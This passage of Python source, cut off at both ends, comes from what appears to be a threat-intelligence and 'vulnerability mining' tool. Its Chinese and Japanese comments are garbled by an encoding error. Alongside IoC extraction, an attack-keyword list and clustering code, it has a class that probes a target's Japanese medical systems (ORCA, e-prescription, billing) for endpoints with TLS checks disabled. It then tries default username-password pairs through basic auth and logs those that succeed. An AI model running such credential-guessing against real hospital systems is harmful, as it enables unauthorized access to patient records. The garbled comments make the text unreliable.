        async def _analyze_ioc_cross_correlations(self) -> List[Dict]:
            """ IoCäº¤å‰å…³è”åˆ†æ"""
            correlations = []
            
            # æå–å„ç§IoCæŒ‡æ ‡
            ioc_database = {
                'file_hashes': set(),
                'domains': set(),
                'urls': set(),
                'ip_addresses': set(),
                'email_addresses': set(),
                'attack_signatures': set()
            }
            
            if hasattr(self.parent, 'data_records'):
                for record in self.parent.data_records:
                    extracted_iocs = self._extract_iocs_from_record(record)
                    
                    for ioc_type, iocs in extracted_iocs.items():
                        if ioc_type in ioc_database:
                            ioc_database[ioc_type].update(iocs)
            
            #  IoCäº¤å‰å…³è”åˆ†æ
            cross_correlations = self._perform_ioc_cross_analysis(ioc_database)
            
            if cross_correlations:
                correlations.append({
                    'type': 'ioc_cross_correlation',
                    'ioc_counts': {k: len(v) for k, v in ioc_database.items()},
                    'cross_correlations': cross_correlations,
                    'correlation_matrix': self._build_ioc_correlation_matrix(ioc_database),
                    'timestamp': datetime.now().isoformat()
                })
            
            return correlations
        
        def _extract_iocs_from_record(self, record) -> Dict[str, Set]:
            """ä»è®°å½•ä¸­æå–IoCæŒ‡æ ‡"""
            iocs = defaultdict(set)
            
            # è·å–è®°å½•æ–‡æœ¬æ•°æ®
            text_data = self._get_record_text_data(record)
            
            if text_data:
                # ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼æå–å„ç§IoC
                import re
                
                # IPåœ°å€
                ip_pattern = r'\b(?:\d{1,3}\.){3}\d{1,3}\b'
                iocs['ip_addresses'].update(re.findall(ip_pattern, text_data))
                
                # åŸŸå
                domain_pattern = r'\b[a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?(\.[a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?)*\.[a-zA-Z]{2,}\b'
                iocs['domains'].update(re.findall(domain_pattern, text_data))
                
                # URL
                url_pattern = r'https?://[^\s<>"{}|\\^`\[\]]+'
                urls = re.findall(url_pattern, text_data)
                iocs['urls'].update(urls)
                
                # é‚®ç®±åœ°å€
                email_pattern = r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b'
                iocs['email_addresses'].update(re.findall(email_pattern, text_data))
                
                # æ–‡ä»¶å“ˆå¸Œ (MD5, SHA1, SHA256)
                hash_patterns = [
                    r'\b[a-fA-F0-9]{32}\b',  # MD5
                    r'\b[a-fA-F0-9]{40}\b',  # SHA1
                    r'\b[a-fA-F0-9]{64}\b'   # SHA256
                ]
                
                for pattern in hash_patterns:
                    iocs['file_hashes'].update(re.findall(pattern, text_data))
                
                # æ”»å‡»ç­¾å
                attack_signatures = [
                    'sql injection', 'xss', 'csrf', 'command injection',
                    'path traversal', 'file inclusion', 'xxe'
                ]
                
                text_lower = text_data.lower()
                for signature in attack_signatures:
                    if signature in text_lower:
                        iocs['attack_signatures'].add(signature)
            
            return dict(iocs)
        
        def _get_record_text_data(self, record) -> str:
            """è·å–è®°å½•çš„æ–‡æœ¬æ•°æ®"""
            text_parts = []
            
            # ä»å¤šä¸ªå±æ€§æ”¶é›†æ–‡æœ¬
            for attr in ['data', 'metadata', 'source_url']:
                if hasattr(record, attr):
                    value = getattr(record, attr)
                    text_parts.append(str(value))
            
            return ' '.join(text_parts)
        
        def _perform_ioc_cross_analysis(self, ioc_database: Dict) -> List[Dict]:
            """æ‰§è¡ŒIoCäº¤å‰åˆ†æ"""
            cross_correlations = []
            
            # åˆ†æä¸åŒIoCç±»å‹ä¹‹é—´çš„å…³è”
            ioc_types = list(ioc_database.keys())
            
            for i, type1 in enumerate(ioc_types):
                for type2 in ioc_types[i+1:]:
                    if ioc_database[type1] and ioc_database[type2]:
                        correlation = self._calculate_ioc_correlation(
                            ioc_database[type1], ioc_database[type2], type1, type2
                        )
                        
                        if correlation['strength'] > 0.1:  # 10%ç›¸å…³æ€§é˜ˆå€¼
                            cross_correlations.append(correlation)
            
            return cross_correlations
        
        def _calculate_ioc_correlation(self, iocs1: Set, iocs2: Set, type1: str, type2: str) -> Dict:
            """è®¡ç®—IoCç›¸å…³æ€§"""
            
            # æ–‡æœ¬ç›¸ä¼¼æ€§åˆ†æï¼ˆç”¨äºåŸŸåã€URLç­‰ï¼‰
            similarity_score = 0.0
            
            if type1 in ['domains', 'urls'] and type2 in ['domains', 'urls']:
                similarity_score = self._calculate_text_similarity(list(iocs1), list(iocs2))
            
            # å…±ç°åˆ†æ
            co_occurrence = len(iocs1.intersection(iocs2)) if type1 == type2 else 0
            
            # è®¡ç®—æ•´ä½“ç›¸å…³å¼ºåº¦
            size_factor = min(len(iocs1), len(iocs2)) / max(len(iocs1), len(iocs2)) if len(iocs1) > 0 and len(iocs2) > 0 else 0
            correlation_strength = (similarity_score * 0.7) + (size_factor * 0.3)
            
            return {
                'ioc_type_pair': f"{type1}+{type2}",
                'strength': correlation_strength,
                'similarity_score': similarity_score,
                'co_occurrence_count': co_occurrence,
                'size_balance': size_factor
            }
        
        def _calculate_text_similarity(self, list1: List[str], list2: List[str]) -> float:
            """è®¡ç®—æ–‡æœ¬åˆ—è¡¨ç›¸ä¼¼æ€§"""
            if not list1 or not list2:
                return 0.0
            
            # ç®€å•çš„å­—ç¬¦ä¸²ç›¸ä¼¼æ€§è®¡ç®—
            similarities = []
            
            for text1 in list1[:10]:  # é™åˆ¶æ¯”è¾ƒæ•°é‡
                for text2 in list2[:10]:
                    # è®¡ç®—ç¼–è¾‘è·ç¦»çš„ç®€åŒ–ç‰ˆæœ¬
                    similarity = self._simple_string_similarity(text1, text2)
                    similarities.append(similarity)
            
            return max(similarities) if similarities else 0.0
        
        def _simple_string_similarity(self, s1: str, s2: str) -> float:
            """ç®€å•å­—ç¬¦ä¸²ç›¸ä¼¼æ€§è®¡ç®—"""
            if s1 == s2:
                return 1.0
            
            # åŸºäºå…¬å…±å­ä¸²çš„ç›¸ä¼¼æ€§
            common_chars = set(s1.lower()) & set(s2.lower())
            total_chars = set(s1.lower()) | set(s2.lower())
            
            return len(common_chars) / len(total_chars) if total_chars else 0.0
        
        def _build_ioc_correlation_matrix(self, ioc_database: Dict) -> Dict:
            """æ„å»ºIoCå…³è”çŸ©é˜µ"""
            matrix = {}
            ioc_types = list(ioc_database.keys())
            
            for type1 in ioc_types:
                matrix[type1] = {}
                for type2 in ioc_types:
                    if type1 == type2:
                        matrix[type1][type2] = 1.0
                    else:
                        correlation = self._calculate_ioc_correlation(
                            ioc_database[type1], ioc_database[type2], type1, type2
                        )
                        matrix[type1][type2] = correlation['strength']
            
            return matrix
        
        async def _analyze_threat_evolution_patterns(self) -> List[Dict]:
            """ å¨èƒæ¼”åŒ–åˆ†æ"""
            correlations = []
            
            # æŒ‰æ—¶é—´åˆ†ç»„å¨èƒäº‹ä»¶
            time_buckets = defaultdict(list)
            
            if hasattr(self.parent, 'data_records'):
                for record in self.parent.data_records:
                    try:
                        timestamp = datetime.fromisoformat(getattr(record, 'timestamp', '').replace('Z', '+00:00'))
                        # æŒ‰å°æ—¶åˆ†ç»„
                        hour_bucket = timestamp.replace(minute=0, second=0, microsecond=0)
                        time_buckets[hour_bucket].append(record)
                    except:
                        continue
            
            # åˆ†æå¨èƒæ¼”åŒ–æ¨¡å¼
            if len(time_buckets) >= 3:  # è‡³å°‘3ä¸ªæ—¶é—´æ®µ
                evolution_analysis = self._analyze_threat_evolution(time_buckets)
                
                correlations.append({
                    'type': 'threat_evolution_analysis',
                    'time_periods_analyzed': len(time_buckets),
                    'evolution_patterns': evolution_analysis,
                    'timestamp': datetime.now().isoformat()
                })
            
            return correlations
        
        def _analyze_threat_evolution(self, time_buckets: Dict) -> Dict:
            """åˆ†æå¨èƒæ¼”åŒ–"""
            
            sorted_times = sorted(time_buckets.keys())
            
            # å¨èƒç±»å‹æ¼”åŒ–
            threat_evolution = []
            
            for i, time_point in enumerate(sorted_times):
                threats_at_time = time_buckets[time_point]
                threat_types = defaultdict(int)
                
                for threat in threats_at_time:
                    threat_type = getattr(threat, 'record_type', 'unknown')
                    threat_types[threat_type] += 1
                
                threat_evolution.append({
                    'time_point': time_point.isoformat(),
                    'threat_distribution': dict(threat_types),
                    'total_threats': len(threats_at_time),
                    'unique_types': len(threat_types)
                })
            
            # è®¡ç®—æ¼”åŒ–æŒ‡æ ‡
            evolution_metrics = self._calculate_evolution_metrics(threat_evolution)
            
            return {
                'evolution_timeline': threat_evolution,
                'metrics': evolution_metrics,
                'trend_analysis': self._analyze_threat_trends(threat_evolution)
            }
        
        def _calculate_evolution_metrics(self, evolution_timeline: List[Dict]) -> Dict:
            """è®¡ç®—æ¼”åŒ–æŒ‡æ ‡"""
            
            if len(evolution_timeline) < 2:
                return {'insufficient_data': True}
            
            # å¨èƒæ•°é‡è¶‹åŠ¿
            threat_counts = [period['total_threats'] for period in evolution_timeline]
            threat_trend = (threat_counts[-1] - threat_counts[0]) / len(threat_counts)
            
            # å¨èƒå¤šæ ·æ€§è¶‹åŠ¿
            diversity_scores = [period['unique_types'] / max(period['total_threats'], 1) 
                             for period in evolution_timeline]
            diversity_trend = (diversity_scores[-1] - diversity_scores[0]) / len(diversity_scores)
            
            import numpy as np
            return {
                'threat_volume_trend': threat_trend,
                'diversity_trend': diversity_trend,
                'peak_activity_period': max(evolution_timeline, key=lambda x: x['total_threats'])['time_point'],
                'evolution_stability': 1.0 - (np.std(threat_counts) / max(np.mean(threat_counts), 1))
            }
        
        def _analyze_threat_trends(self, evolution_timeline: List[Dict]) -> Dict:
            """åˆ†æå¨èƒè¶‹åŠ¿"""
            
            # è¯†åˆ«æ–°å‡ºç°çš„å¨èƒç±»å‹
            all_threat_types = set()
            emerging_threats = []
            
            for i, period in enumerate(evolution_timeline):
                period_threats = set(period['threat_distribution'].keys())
                
                if i > 0:  # ä»ç¬¬äºŒä¸ªæ—¶é—´æ®µå¼€å§‹
                    new_threats = period_threats - all_threat_types
                    if new_threats:
                        emerging_threats.extend(list(new_threats))
                
                all_threat_types.update(period_threats)
            
            # è¯†åˆ«æ¶ˆå¤±çš„å¨èƒç±»å‹
            disappearing_threats = []
            if len(evolution_timeline) >= 2:
                early_threats = set(evolution_timeline[0]['threat_distribution'].keys())
                recent_threats = set(evolution_timeline[-1]['threat_distribution'].keys())
                disappearing_threats = list(early_threats - recent_threats)
            
            return {
                'emerging_threat_types': emerging_threats,
                'disappearing_threat_types': disappearing_threats,
                'persistent_threat_types': list(all_threat_types - set(emerging_threats) - set(disappearing_threats)),
                'threat_type_stability': len(all_threat_types) / max(len(evolution_timeline), 1)
            }
        
        async def _perform_multidimensional_threat_clustering(self) -> List[Dict]:
            """ å¤šç»´åº¦å¨èƒæŒ‡æ ‡èšç±»"""
            correlations = []
            
            # æ„å»ºå¨èƒç‰¹å¾å‘é‡
            threat_vectors = self._build_threat_feature_vectors()
            
            if len(threat_vectors) >= 3:  # è‡³å°‘3ä¸ªå¨èƒå‘é‡
                # æ‰§è¡Œèšç±»åˆ†æ
                clusters = self._perform_threat_clustering(threat_vectors)
                
                correlations.append({
                    'type': 'multidimensional_threat_clustering',
                    'total_threat_vectors': len(threat_vectors),
                    'identified_clusters': len(clusters),
                    'cluster_analysis': clusters,
                    'timestamp': datetime.now().isoformat()
                })
            
            return correlations
        
        def _build_threat_feature_vectors(self) -> List[Dict]:
            """æ„å»ºå¨èƒç‰¹å¾å‘é‡"""
            vectors = []
            
            if hasattr(self.parent, 'data_records'):
                for record in self.parent.data_records:
                    vector = self._extract_threat_features(record)
                    if vector:
                        vectors.append(vector)
            
            return vectors
        
        def _extract_threat_features(self, record) -> Optional[Dict]:
            """æå–å¨èƒç‰¹å¾"""
            try:
                features = {
                    'threat_type': getattr(record, 'record_type', 'unknown'),
                    'severity_score': self._map_severity_to_score(
                        record.metadata.get('severity', 'unknown') if hasattr(record, 'metadata') else 'unknown'
                    ),
                    'timestamp': getattr(record, 'timestamp', ''),
                    'has_metadata': 1 if hasattr(record, 'metadata') and record.metadata else 0,
                    'data_size': len(str(getattr(record, 'data', ''))) if hasattr(record, 'data') else 0
                }
                
                # æ·»åŠ æ›´å¤šç‰¹å¾ç»´åº¦
                if hasattr(record, 'source_url'):
                    features['url_complexity'] = len(record.source_url.split('/')) if record.source_url else 0
                    features['has_parameters'] = 1 if '?' in record.source_url else 0
                
                return features
                
            except Exception:
                return None
        
        def _map_severity_to_score(self, severity: str) -> float:
            """å°†ä¸¥é‡æ€§æ˜ å°„ä¸ºæ•°å€¼åˆ†æ•°"""
            severity_map = {
                'low': 0.25,
                'medium': 0.5,
                'high': 0.75,
                'critical': 1.0,
                'unknown': 0.0
            }
            return severity_map.get(severity.lower(), 0.0)
        
        def _perform_threat_clustering(self, threat_vectors: List[Dict]) -> List[Dict]:
            """æ‰§è¡Œå¨èƒèšç±»"""
            clusters = []
            
            # ç®€åŒ–çš„K-meansèšç±»å®ç°
            # è¿™é‡Œä½¿ç”¨åŸºäºç›¸ä¼¼æ€§çš„èšç±»æ–¹æ³•
            
            processed_vectors = set()
            
            for i, vector1 in enumerate(threat_vectors):
                if i in processed_vectors:
                    continue
                
                cluster_members = [vector1]
                processed_vectors.add(i)
                
                for j, vector2 in enumerate(threat_vectors[i+1:], start=i+1):
                    if j in processed_vectors:
                        continue
                    
                    similarity = self._calculate_vector_similarity(vector1, vector2)
                    if similarity > 0.7:  # 70%ç›¸ä¼¼æ€§é˜ˆå€¼
                        cluster_members.append(vector2)
                        processed_vectors.add(j)
                
                if len(cluster_members) >= 2:  # è‡³å°‘2ä¸ªæˆå‘˜æ‰å½¢æˆèšç±»
                    cluster_analysis = self._analyze_threat_cluster(cluster_members)
                    clusters.append(cluster_analysis)
            
            return clusters
        
        def _calculate_vector_similarity(self, vector1: Dict, vector2: Dict) -> float:
            """è®¡ç®—å¨èƒå‘é‡ç›¸ä¼¼æ€§"""
            
            # å¨èƒç±»å‹ç›¸ä¼¼æ€§
            type_similarity = 1.0 if vector1['threat_type'] == vector2['threat_type'] else 0.0
            
            # ä¸¥é‡æ€§ç›¸ä¼¼æ€§
            severity_diff = abs(vector1['severity_score'] - vector2['severity_score'])
            severity_similarity = 1.0 - severity_diff
            
            # æ•°æ®å¤§å°ç›¸ä¼¼æ€§
            size1, size2 = vector1['data_size'], vector2['data_size']
            if size1 == 0 and size2 == 0:
                size_similarity = 1.0
            elif size1 == 0 or size2 == 0:
                size_similarity = 0.0
            else:
                size_ratio = min(size1, size2) / max(size1, size2)
                size_similarity = size_ratio
            
            # å…ƒæ•°æ®ç›¸ä¼¼æ€§
            metadata_similarity = 1.0 if vector1['has_metadata'] == vector2['has_metadata'] else 0.0
            
            # åŠ æƒç»¼åˆç›¸ä¼¼æ€§
            weights = {
                'type': 0.4,
                'severity': 0.3,
                'size': 0.2,
                'metadata': 0.1
            }
            
            total_similarity = (
                type_similarity * weights['type'] +
                severity_similarity * weights['severity'] +
                size_similarity * weights['size'] +
                metadata_similarity * weights['metadata']
            )
            
            return total_similarity
        
        def _analyze_threat_cluster(self, cluster_members: List[Dict]) -> Dict:
            """åˆ†æå¨èƒèšç±»"""
            
            # èšç±»ç»Ÿè®¡
            threat_types = defaultdict(int)
            severity_scores = []
            data_sizes = []
            
            for member in cluster_members:
                threat_types[member['threat_type']] += 1
                severity_scores.append(member['severity_score'])
                data_sizes.append(member['data_size'])
            
            # èšç±»ç‰¹å¾
            avg_severity = sum(severity_scores) / len(severity_scores)
            avg_data_size = sum(data_sizes) / len(data_sizes)
            dominant_threat_type = max(threat_types, key=threat_types.get)
            
            import numpy as np
            return {
                'cluster_size': len(cluster_members),
                'dominant_threat_type': dominant_threat_type,
                'threat_type_distribution': dict(threat_types),
                'average_severity_score': avg_severity,
                'average_data_size': avg_data_size,
                'cluster_homogeneity': threat_types[dominant_threat_type] / len(cluster_members),
                'severity_variance': np.var(severity_scores) if len(severity_scores) > 1 else 0.0
            }
        
        async def _execute_vulnerability_clustering(self) -> List[Dict]:
            """æ‰§è¡Œæ¼æ´èšç±»"""
            print(f"[] æ‰§è¡Œæ¼æ´èšç±»åˆ†æ...")
            
            clusters = []
            
            # åŸºäºè®°å½•ç±»å‹èšç±»
            type_clusters = defaultdict(list)
            
            if hasattr(self.parent, 'data_records'):
                for record in self.parent.data_records:
                    record_type = getattr(record, 'record_type', 'unknown')
                    type_clusters[record_type].append(record)
            
            # åˆ†ææ¯ä¸ªèšç±»
            for cluster_type, records in type_clusters.items():
                if len(records) >= 3:  # è‡³å°‘3ä¸ªè®°å½•æ‰å½¢æˆèšç±»
                    cluster_analysis = await self._analyze_vulnerability_cluster(cluster_type, records)
                    if cluster_analysis:
                        clusters.append(cluster_analysis)
            
            return clusters
        
        async def _analyze_vulnerability_cluster(self, cluster_type: str, records: List) -> Dict:
            """åˆ†ææ¼æ´èšç±»"""
            # åˆ†æèšç±»ç‰¹å¾
            sources = set()
            severity_levels = []
            timestamps = []
            
            for record in records:
                if hasattr(record, 'source_url'):
                    sources.add(record.source_url)
                
                if hasattr(record, 'metadata'):
                    if 'severity' in record.metadata:
                        severity_levels.append(record.metadata['severity'])
                
                if hasattr(record, 'timestamp'):
                    timestamps.append(record.timestamp)
            
            # è®¡ç®—èšç±»æŒ‡æ ‡
            cluster_size = len(records)
            source_diversity = len(sources)
            severity_distribution = defaultdict(int)
            for severity in severity_levels:
                severity_distribution[severity] += 1
            
            return {
                'type': 'vulnerability_cluster',
                'cluster_category': cluster_type,
                'cluster_size': cluster_size,
                'source_diversity': source_diversity,
                'severity_distribution': dict(severity_distribution),
                'time_span': {
                    'start': min(timestamps) if timestamps else None,
                    'end': max(timestamps) if timestamps else None
                },
                'cluster_density': cluster_size / max(source_diversity, 1),
                'risk_assessment': self._assess_cluster_risk(severity_distribution, cluster_size),
                'timestamp': datetime.now().isoformat()
            }
        
        def _assess_cluster_risk(self, severity_distribution: Dict, cluster_size: int) -> str:
            """è¯„ä¼°èšç±»é£é™©"""
            critical_count = severity_distribution.get('critical', 0)
            high_count = severity_distribution.get('high', 0)
            
            if critical_count > 0 or (high_count >= 3 and cluster_size >= 5):
                return 'high'
            elif high_count > 0 or cluster_size >= 10:
                return 'medium'
            else:
                return 'low'
        
        async def _execute_compliance_gap_analysis(self) -> List[Dict]:
            """æ‰§è¡Œåˆè§„å·®è·åˆ†æ"""
            print(f"[âš–ï¸] æ‰§è¡Œåˆè§„å·®è·åˆ†æ...")
            
            compliance_gaps = []
            
            # åˆ†æåŒ»ç–—åˆè§„å·®è·
            medical_gaps = await self._analyze_medical_compliance_gaps()
            compliance_gaps.extend(medical_gaps)
            
            # åˆ†ææ•°æ®ä¿æŠ¤åˆè§„å·®è·
            privacy_gaps = await self._analyze_privacy_compliance_gaps()
            compliance_gaps.extend(privacy_gaps)
            
            return compliance_gaps
        
        async def _analyze_medical_compliance_gaps(self) -> List[Dict]:
            """åˆ†æåŒ»ç–—åˆè§„å·®è·"""
            gaps = []
            
            # æ£€æŸ¥æ˜¯å¦æœ‰åŒ»ç–—æ•°æ®æš´éœ²
            medical_exposures = []
            if hasattr(self.parent, 'data_records'):
                for record in self.parent.data_records:
                    record_type = getattr(record, 'record_type', '')
                    if 'medical' in record_type.lower() or 'patient' in record_type.lower():
                        medical_exposures.append(record)
            
            if medical_exposures:
                gaps.append({
                    'type': 'medical_data_exposure_gap',
                    'gap_description': 'åŒ»ç–—æ•°æ®å¯èƒ½æœªå—é€‚å½“ä¿æŠ¤',
                    'affected_records': len(medical_exposures),
                    'compliance_frameworks': ['HIPAA', 'Medical_Device_Regulation', 'Japan_Medical_Information_Protection'],
                    'severity': 'critical',
                    'remediation_priority': 'immediate',
                    'timestamp': datetime.now().isoformat()
                })
            
            return gaps
        
        async def _analyze_privacy_compliance_gaps(self) -> List[Dict]:
            """åˆ†æéšç§åˆè§„å·®è·"""
            gaps = []
            
            # æ£€æŸ¥ä¸ªäººæ•°æ®æš´éœ²
            personal_data_exposures = []
            if hasattr(self.parent, 'data_records'):
                for record in self.parent.data_records:
                    data_text = str(getattr(record, 'data', ''))
                    
                    # æ£€æŸ¥ä¸ªäººä¿¡æ¯æ¨¡å¼
                    personal_patterns = [
                        r'\b\d{3}-\d{2}-\d{4}\b',  # SSNæ ¼å¼
                        r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b',  # Email
                        r'\b\d{3}-\d{3}-\d{4}\b',  # ç”µè¯æ ¼å¼
                    ]
                    
                    for pattern in personal_patterns:
                        if re.search(pattern, data_text):
                            personal_data_exposures.append(record)
                            break
            
            if personal_data_exposures:
                gaps.append({
                    'type': 'personal_data_exposure_gap',
                    'gap_description': 'ä¸ªäººæ•°æ®å¯èƒ½æœªå—GDPR/éšç§æ³•ä¿æŠ¤',
                    'affected_records': len(personal_data_exposures),
                    'compliance_frameworks': ['GDPR', 'CCPA', 'Japan_Personal_Information_Protection_Act'],
                    'severity': 'high',
                    'remediation_priority': 'high',
                    'timestamp': datetime.now().isoformat()
                })
            
            return gaps
        
        def get_intelligence_summary(self) -> Dict[str, Any]:
            """è·å–æƒ…æŠ¥æ‘˜è¦"""
            return {
                'total_intelligence_items': len(self.intelligence_database),
                'pattern_signatures_count': len(self.pattern_signatures),
                'behavioral_profiles_count': len(self.behavioral_profiles),
                'threat_indicators_count': len(self.threat_indicators),
                'correlation_graph_size': len(self.data_correlation_graph),
                'cache_efficiency': len(self.mining_cache),
                'mining_modes_enabled': sum(1 for mode in self.mining_modes.values() if mode),
                'intelligence_categories': {
                    'pattern_recognition': len([item for item in self.intelligence_database.values() if 'pattern' in item.get('type', '')]),
                    'behavioral_analysis': len(self.behavioral_profiles),
                    'threat_intelligence': len(self.threat_indicators),
                    'data_correlation': len(self.data_correlation_graph),
                    'vulnerability_clustering': len([item for item in self.intelligence_database.values() if 'cluster' in item.get('type', '')]),
                    'compliance_analysis': len([item for item in self.intelligence_database.values() if 'compliance' in item.get('type', '')])
                }
            }

    #  æ—¥æœ¬åŒ»ç–—ç‰¹å®šåˆè§„æ€§æ¼æ´æŒ–æ˜
    class JapanMedicalComplianceAnalyzer:
        """æ—¥æœ¬åŒ»ç–—ç‰¹å®šåˆè§„æ€§æ¼æ´æŒ–æ˜å™¨"""
        
        def __init__(self):
            # æ—¥æœ¬åŒ»ç–—æ³•è§„å…³é”®è¯
            self.compliance_keywords = {
                'personal_info_protection': [
                    'å€‹äººæƒ…å ±', 'æ‚£è€…æƒ…å ±', 'è¨ºç™‚æƒ…å ±', 'åŒ»ç™‚æƒ…å ±',
                    'patient_info', 'medical_record', 'è¨ºç™‚è¨˜éŒ²'
                ],
                'medical_device_regulation': [
                    'åŒ»ç™‚æ©Ÿå™¨', 'è¨ºæ–­è£…ç½®', 'DICOM', 'PACS',
                    'medical_device', 'diagnostic_equipment'
                ],
                'pharmaceutical_regulation': [
                    'è–¬äº‹æ³•', 'åŒ»è–¬å“', 'å‡¦æ–¹ç®‹', 'è–¬å‰¤æƒ…å ±',
                    'prescription', 'medication', 'è–¬å“'
                ],
                'insurance_regulation': [
                    'ä¿é™ºè¨ºç™‚', 'è¨ºç™‚å ±é…¬', 'ãƒ¬ã‚»ãƒ—ãƒˆ', 'åŒ»ç™‚ä¿é™º',
                    'insurance_claim', 'medical_insurance'
                ]
            }
            
            # æ—¥æœ¬ç‰¹æœ‰çš„åŒ»ç–—ç³»ç»Ÿ
            self.japan_medical_systems = {
                'orca': {
                    'name': 'ORCAåŒ»äº‹è¨ˆç®—æ©Ÿã‚·ã‚¹ãƒ†ãƒ ',
                    'endpoints': ['/orca', '/orca/api', '/medical/orca'],
                    'vulnerabilities': ['default_credentials', 'unencrypted_data', 'weak_session']
                },
                'recepta': {
                    'name': 'é›»å­å‡¦æ–¹ç®‹ã‚·ã‚¹ãƒ†ãƒ ',
                    'endpoints': ['/recepta', '/prescription', '/é›»å­å‡¦æ–¹ç®‹'],
                    'vulnerabilities': ['prescription_tampering', 'patient_data_leak']
                },
                'rezept': {
                    'name': 'è¨ºç™‚å ±é…¬è«‹æ±‚ã‚·ã‚¹ãƒ†ãƒ ',
                    'endpoints': ['/rezept', '/claim', '/è¨ºç™‚å ±é…¬'],
                    'vulnerabilities': ['financial_data_exposure', 'billing_manipulation']
                }
            }
        
        async def analyze_japan_medical_compliance(self, target_url: str) -> Dict[str, Any]:
            """åˆ†ææ—¥æœ¬åŒ»ç–—åˆè§„æ€§"""
            print(f"\n[ğŸ‡¯ğŸ‡µ] æ—¥æœ¬åŒ»ç–—åˆè§„æ€§åˆ†æå¯åŠ¨...")
            
            analysis_results = {
                'detected_systems': [],
                'compliance_violations': [],
                'data_protection_issues': [],
                'regulatory_risks': [],
                'recommendations': []
            }
            
            # 1. æ£€æµ‹æ—¥æœ¬åŒ»ç–—ç³»ç»Ÿ
            for system_key, system_info in self.japan_medical_systems.items():
                detection_result = await self._detect_japan_medical_system(target_url, system_key, system_info)
                if detection_result:
                    analysis_results['detected_systems'].append(detection_result)
            
            # 2. åˆ†æä¸ªäººæƒ…æŠ¥ä¿æŠ¤æ³•åˆè§„æ€§
            privacy_analysis = await self._analyze_personal_info_protection(target_url)
            analysis_results['data_protection_issues'].extend(privacy_analysis)
            
            # 3. åˆ†æåŒ»ç–—æœºå™¨æ³•åˆè§„æ€§
            device_analysis = await self._analyze_medical_device_compliance(target_url)
            analysis_results['regulatory_risks'].extend(device_analysis)
            
            # 4. åˆ†æè¯äº‹æ³•åˆè§„æ€§
            pharma_analysis = await self._analyze_pharmaceutical_compliance(target_url)
            analysis_results['compliance_violations'].extend(pharma_analysis)
            
            # 5. ç”Ÿæˆåˆè§„æ€§å»ºè®®
            analysis_results['recommendations'] = self._generate_compliance_recommendations(analysis_results)
            
            # è¾“å‡ºåˆ†æç»“æœ
            print(f"[] æ—¥æœ¬åŒ»ç–—åˆè§„æ€§åˆ†æç»“æœ:")
            print(f"    æ£€æµ‹åˆ°ç³»ç»Ÿ: {len(analysis_results['detected_systems'])}")
            print(f"    åˆè§„è¿è§„: {len(analysis_results['compliance_violations'])}")
            print(f"    æ•°æ®ä¿æŠ¤é—®é¢˜: {len(analysis_results['data_protection_issues'])}")
            print(f"    ç›‘ç®¡é£é™©: {len(analysis_results['regulatory_risks'])}")
            
            return analysis_results
        
        async def _detect_japan_medical_system(self, target_url: str, system_key: str, system_info: Dict) -> Optional[Dict]:
            """æ£€æµ‹æ—¥æœ¬åŒ»ç–—ç³»ç»Ÿ"""
            async with aiohttp.ClientSession() as session:
                for endpoint in system_info['endpoints']:
                    url = urljoin(target_url, endpoint)
                    try:
                        async with session.get(url, timeout=10, ssl=False) as resp:
                            if resp.status in [200, 401, 403]:
                                content = await resp.text() if resp.status == 200 else ""
                                
                                # æ£€æŸ¥æ˜¯å¦ä¸ºç›®æ ‡ç³»ç»Ÿ
                                if self._is_target_system(content, system_key):
                                    vulnerabilities = await self._check_system_vulnerabilities(
                                        session, url, system_info['vulnerabilities']
                                    )
                                    
                                    return {
                                        'system': system_key,
                                        'name': system_info['name'],
                                        'endpoint': endpoint,
                                        'url': url,
                                        'status': resp.status,
                                        'vulnerabilities': vulnerabilities,
                                        'compliance_impact': self._assess_system_compliance_impact(system_key)
                                    }
                    except Exception:
                        continue
            
            return None
        
        def _is_target_system(self, content: str, system_key: str) -> bool:
            """åˆ¤æ–­æ˜¯å¦ä¸ºç›®æ ‡ç³»ç»Ÿ"""
            content_lower = content.lower()
            
            system_indicators = {
                'orca': ['orca', 'æ—¥åŒ»æ¨™æº–ãƒ¬ã‚»ãƒ—ãƒˆ', 'åŒ»äº‹è¨ˆç®—æ©Ÿ'],
                'recepta': ['recepta', 'é›»å­å‡¦æ–¹ç®‹', 'prescription'],
                'rezept': ['rezept', 'ãƒ¬ã‚»ãƒ—ãƒˆ', 'è¨ºç™‚å ±é…¬']
            }
            
            indicators = system_indicators.get(system_key, [])
            return any(indicator in content_lower for indicator in indicators)
        
        async def _check_system_vulnerabilities(self, session: aiohttp.ClientSession, url: str, vulnerabilities: List[str]) -> List[Dict]:
            """æ£€æŸ¥ç³»ç»Ÿæ¼æ´"""
            found_vulnerabilities = []
            
            for vuln_type in vulnerabilities:
                if vuln_type == 'default_credentials':
                    # æ£€æŸ¥é»˜è®¤å‡­æ®
                    default_creds = [
                        ('orca', 'orca'),
                        ('admin', 'admin'),
                        ('åŒ»ç™‚', 'åŒ»ç™‚'),
                        ('hospital', 'hospital')
                    ]
                    
                    for username, password in default_creds:
                        try:
                            auth = aiohttp.BasicAuth(username, password)
                            async with session.get(url, auth=auth, timeout=5) as resp:
                                if resp.status not in [401, 403]:
                                    found_vulnerabilities.append({
                                        'type': 'default_credentials',
                                        'details': f'é»˜è®¤å‡­æ®æœ‰æ•ˆ: {username}:{password}',
                                        'severity': 'critical',
                                        'compliance_impact': 'å€‹äººæƒ…å ±ä¿è­·æ³•é•å'
                                    })
                                    break
                        except Exception:
                            continue
                
                elif vuln_type == 'unencrypted_data':
                    # æ£€æŸ¥æœªåŠ å¯†æ•°æ®ä¼ è¾“
                    if url.startswith('http://'):
                        found_vulnerabilities.append({
                            'type': 'unencrypted_transmission',
                            'details': 'HTTPåè®®ä¼ è¾“åŒ»ç–—æ•°æ®',
                            'severity': 'high',
                            'compliance_impact': 'åŒ»ç™‚æƒ…å ±ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£åŸºæº–é•å'
                        })
            
            return found_vulnerabilities
        
        def _assess_system_compliance_impact(self, system_key: str) -> str:
            """è¯„ä¼°ç³»ç»Ÿåˆè§„æ€§å½±å“"""
            compliance_impacts = {
                'orca': 'å€‹äººæƒ…å ±ä¿è­·æ³•ãƒ»åŒ»ç™‚æ³•ãƒ»è¨ºç™‚å ±é…¬è¦å‰‡',
